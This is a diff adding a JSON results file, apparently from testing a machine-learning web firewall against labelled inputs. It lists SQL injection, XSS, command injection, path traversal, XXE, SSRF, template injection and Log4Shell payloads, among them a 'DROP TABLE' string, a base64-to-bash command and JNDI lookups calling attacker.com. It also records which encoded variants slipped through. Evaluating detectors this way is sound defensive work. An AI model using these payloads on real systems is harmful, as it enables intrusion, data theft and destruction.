@@ -1,0 +1,250 @@
+[
+  {
+    "category": "SQL Injection",
+    "name": "Basic",
+    "payload": "' OR '1'='1",
+    "risk_score": 0.9997091015975457,
+    "action": "block",
+    "predicted_type": "sqli"
+  },
+  {
+    "category": "SQL Injection",
+    "name": "Blind Time-based",
+    "payload": "' AND (SELECT SLEEP(5))--",
+    "risk_score": 0.999974852637024,
+    "action": "block",
+    "predicted_type": "sqli"
+  },
+  {
+    "category": "SQL Injection",
+    "name": "Union",
+    "payload": "' UNION SELECT username, password FROM users--",
+    "risk_score": 0.9999625301643391,
+    "action": "block",
+    "predicted_type": "sqli"
+  },
+  {
+    "category": "SQL Injection",
+    "name": "Boolean",
+    "payload": "' AND 1=1--",
+    "risk_score": 0.9998361689504236,
+    "action": "block",
+    "predicted_type": "sqli"
+  },
+  {
+    "category": "SQL Injection",
+    "name": "Stacked",
+    "payload": "'; DROP TABLE users--",
+    "risk_score": 0.9999480037149624,
+    "action": "block",
+    "predicted_type": "sqli"
+  },
+  {
+    "category": "XSS",
+    "name": "Basic",
+    "payload": "<script>alert(1)</script>",
+    "risk_score": 0.9999815818355273,
+    "action": "block",
+    "predicted_type": "xss"
+  },
+  {
+    "category": "XSS",
+    "name": "DOM",
+    "payload": "\"><img src=x onerror=alert(document.cookie)>",
+    "risk_score": 0.9999994325484067,
+    "action": "block",
+    "predicted_type": "xss"
+  },
+  {
+    "category": "XSS",
+    "name": "Obfuscated",
+    "payload": "<scr<script>ipt>alert(1)</script>",
+    "risk_score": 0.9999541128527198,
+    "action": "block",
+    "predicted_type": "xss"
+  },
+  {
+    "category": "Command Injection",
+    "name": "Basic",
+    "payload": "; cat /etc/passwd",
+    "risk_score": 0.9999991739323946,
+    "action": "block",
+    "predicted_type": "command_injection"
+  },
+  {
+    "category": "Command Injection",
+    "name": "Pipe",
+    "payload": "| whoami",
+    "risk_score": 0.9999988961862982,
+    "action": "block",
+    "predicted_type": "command_injection"
+  },
+  {
+    "category": "Command Injection",
+    "name": "Base64 Exec",
+    "payload": "echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash",
+    "risk_score": 0.9998835248043179,
+    "action": "block",
+    "predicted_type": "command_injection"
+  },
+  {
+    "category": "Path Traversal",
+    "name": "Basic",
+    "payload": "../../../etc/passwd",
+    "risk_score": 0.9999999798354935,
+    "action": "block",
+    "predicted_type": "path_traversal"
+  },
+  {
+    "category": "Path Traversal",
+    "name": "Windows",
+    "payload": "..\\..\\..\\windows\\system32\\cmd.exe",
+    "risk_score": 0.9999995722584174,
+    "action": "block",
+    "predicted_type": "path_traversal"
+  },
+  {
+    "category": "Path Traversal",
+    "name": "Directory Traversal",
+    "payload": "..%2f..%2f..%2fetc%2fpasswd",
+    "risk_score": 0.0,
+    "action": "allow",
+    "predicted_type": "normal"
+  },
+  {
+    "category": "XXE",
+    "name": "Basic",
+    "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
+    "risk_score": 0.9999998376753183,
+    "action": "block",
+    "predicted_type": "xxe"
+  },
+  {
+    "category": "SSRF",
+    "name": "Basic",
+    "payload": "http://169.254.169.254/latest/meta-data/",
+    "risk_score": 0.0,
+    "action": "allow",
+    "predicted_type": "normal"
+  },
+  {
+    "category": "SSRF",
+    "name": "Localhost",
+    "payload": "http://127.0.0.1/admin",
+    "risk_score": 0.0,
+    "action": "allow",
+    "predicted_type": "normal"
+  },
+  {
+    "category": "SSTI",
+    "name": "Jinja2",
+    "payload": "{{7*7}}",
+    "risk_score": 0.9999935555829325,
+    "action": "block",
+    "predicted_type": "ssti"
+  },
+  {
+    "category": "SSTI",
+    "name": "EL",
+    "payload": "${7*7}",
+    "risk_score": 0.9999985451046314,
+    "action": "block",
+    "predicted_type": "ssti"
+  },
+  {
+    "category": "Log4Shell",
+    "name": "Basic",
+    "payload": "${jndi:ldap://attacker.com/a}",
+    "risk_score": 0.999999986743819,
+    "action": "block",
+    "predicted_type": "log4shell"
+  },
+  {
+    "category": "Log4Shell",
+    "name": "Obfuscated",
+    "payload": "${${lower:j}ndi:ldap://attacker.com/a}",
+    "risk_score": 0.9999999938987374,
+    "action": "block",
+    "predicted_type": "log4shell"
+  },
+  {
+    "category": "Payload Variations",
+    "name": "URL Encoded SQLi",
+    "payload": "%27%20OR%20%271%27%3D%271",
+    "risk_score": 0.0,
+    "action": "allow",
+    "predicted_type": "normal"
+  },
+  {
+    "category": "Payload Variations",
+    "name": "Double URL Encoded SQLi",
+    "payload": "%2527%2520OR%2520%25271%2527%253D%25271",
+    "risk_score": 0.0,
+    "action": "allow",
+    "predicted_type": "normal"
+  },
+  {
+    "category": "Payload Variations",
+    "name": "Unicode SQLi",
+    "payload": "\\u0027 OR \\u00271\\u0027=\\u00271",
+    "risk_score": 0.0,
+    "action": "allow",
+    "predicted_type": "normal"
+  },
+  {
+    "category": "Payload Variations",
+    "name": "Mixed (SQLi + XSS)",
+    "payload": "' OR '1'='1; <script>alert(1)</script>",
+    "risk_score": 0.9999466625849891,
+    "action": "block",
+    "predicted_type": "xss"
+  },
+  {
+    "category": "Legitimate (False Positives)",
+    "name": "Login",
+    "payload": "user123",
+    "risk_score": 0.0,
+    "action": "allow",
+    "predicted_type": "normal"
+  },
+  {
+    "category": "Legitimate (False Positives)",
+    "name": "Search",
+    "payload": "Apple iPhone 15 Pro Max",
+    "risk_score": 0.0,
+    "action": "allow",
+    "predicted_type": "normal"
+  },
+  {
+    "category": "Legitimate (False Positives)",
+    "name": "Filename",
+    "payload": "filename=report_2024.pdf",
+    "risk_score": 0.0,
+    "action": "allow",
+    "predicted_type": "normal"
+  },
+  {
+    "category": "Legitimate (False Positives)",
+    "name": "URL",
+    "payload": "https://google.com/search?q=test",
+    "risk_score": 0.0,
+    "action": "allow",
+    "predicted_type": "normal"
+  },
+  {
+    "category": "Legitimate (False Positives)",
+    "name": "JSON",
+    "payload": "{\"username\":\"john\", \"role\":\"admin\", \"age\": 30}",
+    "risk_score": 0.9485539607703686,
+    "action": "block",
+    "predicted_type": "xss"
+  },
+  {
+    "category": "Legitimate (False Positives)",
+    "name": "XML",
+    "payload": "<user><name>john</name><role>admin</role></user>",
+    "risk_score": 0.987445455044508,
+    "action": "block",
+    "predicted_type": "xss"
+  }
+]
